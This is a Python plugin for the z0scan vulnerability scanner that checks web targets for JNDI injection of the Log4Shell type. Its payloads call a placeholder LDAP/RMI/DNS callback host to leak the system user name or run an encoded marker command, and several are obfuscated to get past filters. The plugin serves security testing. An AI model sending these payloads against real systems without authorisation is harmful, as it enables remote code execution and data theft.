#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# JiuZero/z0scan

from api import generateResponse, VulType, Type, PluginBase, conf, Threads
import re

class Z0SCAN(PluginBase):
    name = "jndi-error"
    desc = "JNDI Injection Vulnerability Scanner"
    version = "2025.8.30"
    risk = 3

    def audit(self):
        if (not self.fingerprints.waf) and (conf.level != 0):
            _payloads = [
                "${jndi:ldap://z0scan-test.xxx.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC96MHNjYW4x}",
                "${jndi:rmi://z0scan-test.xxx.com:1099/z0scan2}",
                "${${lower:j}ndi:${lower:ldap}://z0scan-test.xxx.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC96MHNjYW4z}",
                "${jndi:ldap://z0scan-test.xxx.com:1389/${sys:user.name}/z0scan4}"
            ]
            if conf.level == 3:
                _payloads += [
                    "${jndi:iiop://z0scan-test.xxx.com:3890/z0scan5}",
                    "${jndi:dns://z0scan-test.xxx.com:53/z0scan6}",
                    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://z0scan-test.xxx.com:1389/z0scan7}"
                ]

            iterdatas = self.generateItemdatas()
            if not iterdatas:
                return
            z0thread = Threads(name=self.name)
            z0thread.submit(self.process, iterdatas, _payloads)

    def process(self, _, _payloads):
        k, v, position = _
        for _payload in _payloads:
            modified_data = self.insertPayload({
                "key": k,
                "position": position,
                "payload": _payload
            })

            r = self.req(position, modified_data)
            if not r:
                continue

            html = r.text.lower()
            jndi_patterns = [
                r"javax.naming.communicationexception",
                r"ldap context not found",
                r"rmi connection refused",
                r"z0scan-test.xxx.com"
            ]
            match_flag = any(re.search(pattern, html) for pattern in jndi_patterns)

            if match_flag:
                result = self.generate_result()
                result.main({
                    "type": Type.REQUEST,
                    "url": self.requests.url,
                    "vultype": VulType.OTHER,
                    "show": {
                        "Position": f"{position} > {k}",
                        "Payload": _payload,
                        "Msg": "Possible JNDI Injection Vulnerability (Match JNDI Error/Callback Trace)"
                    }
                })
                result.step("Request", {
                    "request": r.reqinfo,
                    "response": generateResponse(r),
                    "desc": f"Payload '{_payload}' triggered JNDI-related response (risk: HIGH)"
                })
                self.success(result)
                return True